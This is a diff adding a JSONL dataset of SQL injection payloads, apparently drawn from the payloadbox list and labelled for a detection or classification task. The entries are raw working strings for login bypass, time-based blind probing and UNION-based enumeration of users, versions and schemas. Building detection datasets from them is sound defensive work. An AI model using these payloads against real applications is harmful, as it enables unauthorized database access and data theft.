@@ -1,0 +1,1234 @@
+{"payload": "\u0018 or 1=1 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "!", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" \"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" #", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" AND 1=0 UNION ALL SELECT \"\", \"81dc9bdb52d04dc20036dbd8313ed055", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"\" \"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"\"&\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"\"*\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"\"-\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"\"=\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"\"^\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"1\"=\"1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"1\"=\"1\"#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"1\"=\"1\"--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"1\"=\"1\"/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"a\"=\"a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or \"x\"=\"x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 0=0 #", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 0=0 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 0=0 –", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 1=1 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 1=1 –", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 1=1/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or 1=1–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or isNULL(1/0) /*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or sleep(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or sleep(5)=\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or sleep(__TIME__)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\" or true--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"&\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or \"1\"=\"1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or \"1\"=\"1\"#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or \"1\"=\"1\"--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or \"1\"=\"1\"/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or (\"1\"=\"1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or (\"1\"=\"1\"#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or (\"1\"=\"1\"--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or (\"1\"=\"1\"/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or (\"a\"=\"a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or (\"x\")=(\"x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or pg_sleep(__TIME__)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or sleep(5)=\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\") or true--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")) or ((\"x\"))=((\"x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")) or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")) or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")) or sleep(5)=\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\")))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"));waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"));waitfor delay '0:0:__TIME__'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\");waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\");waitfor delay '0:0:__TIME__'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"*\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"-\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\";waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\";waitfor delay '0:0:__TIME__'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"^\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "\"or 1=1 or \"\"=\"", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "# from wapiti", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "#NAME?", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%' AND 8310=8310 AND '%'='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%' AND 8310=8311 AND '%'='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%' or '0'='0", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%20$(sleep%2050)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%20'sleep%2050'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%20or%20''='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%20or%20'x'='x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%20or%201=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%20or%20x=x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%27%20or%201=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%2A%28%7C%28mail%3D%2A%29%29", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%2A%28%7C%28objectclass%3D%2A%29%29", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%2A%7C", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "%7C", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "&", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "&&SLEEP(5)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "&&SLEEP(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "&&SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "&apos;%20OR", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' #", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' '", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' (select top 1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' AnD SLEEP(5) ANd '1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' OR 'x'='x'#;", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' UNION ALL SELECT", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' UNION ALL SELECT 1, @@version;#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' UNION ALL SELECT system_user(),user();#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' UNION SELECT", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' UNION select table_schema,table_name FROM information_Schema.tables;#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' and 'one'='one", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' and 'one'='one–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' and 1='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' and a='a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' and substring(password/text(),1,1)='7", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' group by password having 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' group by userid having 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' group by username having 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or         0=0 #", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or '' '", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or ''&'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or ''*'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or ''-'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or ''='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or ''^'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or '1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or '1'='1'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or '1'='1'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or '1'='1'/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or '1′='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 'a'='a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 'one'='one", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 'one'='one–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 'x'='x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or (EXISTS)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 0=0 #", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 0=0 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 0=0 –", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1 --'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1 LIMIT 1;#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1 limit 1 -- -+", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1 or ''='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1 –", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1;#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 1=1–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 3=3", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or 3=3 --", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or a=a--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or a=a–", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or sleep(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or sleep(5)='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or true--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or uid like '%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or uname like '%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or user like '%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or userid like '%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' or username like '%", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "' –", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'%20or%20''='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'%20or%20'x'='x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'%20or%201=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'&&SLEEP(5)&&'1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'&'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or '1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or '1'='1'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or '1'='1'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or '1'='1'/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or '1'='1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('1'='1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('1'='1'#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('1'='1'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('1'='1'/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('1'='1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('a'='a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('a'='a and hi\") or (\"a\"=\"a", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('x')=('x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or ('x'='x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or sleep(5)='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "') or true--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')%20or%20('x'='x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')) or (('x'))=(('x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')) or benchmark(10000000,MD5(1))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')) or pg_sleep(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')) or sleep(5)='", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')))) and 0=benchmark(3000000,MD5(1))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')))) and 0=benchmark(3000000,MD5(1))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "')))) and 0=benchmark(3000000,MD5(1))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'));waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "');waitfor delay '0:0:5'--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'*'", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*", "attack_type": "sqli", "source": "payloadbox-sqli"}
